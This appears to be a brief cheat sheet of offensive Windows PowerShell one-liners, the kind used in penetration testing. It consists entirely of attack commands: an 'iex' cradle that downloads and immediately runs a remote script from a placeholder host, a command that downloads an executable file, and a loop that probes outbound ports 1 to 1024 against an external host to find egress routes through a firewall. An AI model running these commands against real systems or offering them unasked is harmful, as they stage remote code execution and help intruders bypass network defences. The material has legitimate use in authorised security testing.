# Windows Powershell Commands

**Download and Execute Remote Powershell Script**

```iex (New-Object Net.WebClient).DownloadString("http://host/file.txt")```

**Download and Save File**

```(new-object System.Net.WebClient).Downloadfile('http://host/file.exe', 'file.exe')```

**Enumerate Allowed Outbound Ports**

```1..1024 | % {$test= new-object system.Net.Sockets.TcpClient; $wait = $test.beginConnect("letmeoutofyour.net",$_,$null,$null); ($wait.asyncwaithandle.waitone(250,$false)); if($test.Connected){echo "$_ is allowed out"}} | select-string "allowed"```
